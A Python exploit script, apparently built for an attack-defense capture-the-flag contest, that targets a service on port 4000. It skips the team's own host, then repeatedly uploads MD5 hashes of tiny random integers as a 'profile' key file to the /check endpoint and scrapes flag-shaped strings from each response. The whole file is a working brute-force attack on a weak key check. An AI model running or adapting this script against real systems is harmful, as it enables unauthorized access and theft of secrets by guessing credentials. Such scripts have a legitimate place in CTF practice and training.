#!/usr/bin/env python3

import requests
import sys
import re
import random
import json
import hashlib

flagRegEx = re.compile(r'[A-Za-z0-9]{31}=')

our_host = "10.136.182.1"		# define out host
port = 4000 					# define port of service

alph = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789'
# printable = string.printable

# POST requests
# data = { 'key':'value', 'key1':'value1' }
# res = requests.post( host + "some-url", data=data )

def md5(data): return hashlib.md5(data).hexdigest()
def sha1(data): return hashlib.sha1(data).hexdigest()
def sha256(data): return hashlib.sha256(data).hexdigest()


def main():

	# do not forgot about strip(), split(), replace() - functions to parsing
	url = f'http://{host}:{port}/'
	
	for bb in range(2**8):
		bb = random.randrange(2**3)
		h = md5(bb.to_bytes(16, 'big'))
		with open("my.key", "w") as file:
			file.write(h)

		resp = requests.post(
			url + "check",
			files = {
				'profile': open('my.key','rb')
			}
		)
		
		flag_list = flagRegEx.findall( resp.text )
		print(*flag_list, sep="\n", flush=True)
		sys.stdout.flush() 	# after print


def idgen( size = 8, chars=alph ):
	return ''.join( random.choice( chars ) for _ in range( size ) )


if __name__ == '__main__':
	
	if len(sys.argv) > 1:
		host = sys.argv[1]
	else:
		print(f"Usage: python3 {sys.argv[0]} <host>")
		sys.exit(-1)
	
	if host == our_host:
		sys.exit(-4)
	
	main()